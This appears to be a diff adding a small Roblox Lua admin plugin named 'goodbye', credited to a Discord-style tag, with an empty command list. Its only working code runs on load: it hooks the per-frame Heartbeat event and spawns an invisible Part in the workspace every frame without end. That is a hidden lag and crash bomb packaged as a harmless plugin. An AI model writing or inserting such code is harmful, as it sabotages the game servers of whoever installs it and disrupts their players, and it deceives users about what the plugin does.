@@ -1,0 +1,11 @@
+game:GetService('RunService').Heartbeat:Connect(function()
+local nerd = Instance.new("Part", workspace)
+nerd.Transparency = 1
+nerd.CFrame = CFrame.new(9,9,9)
+end)
+
+return {
+    ["PluginName"] = "goodbye",
+    ["PluginDescription"] = "Empire#4946",
+    ["Commands"] = {}
+}
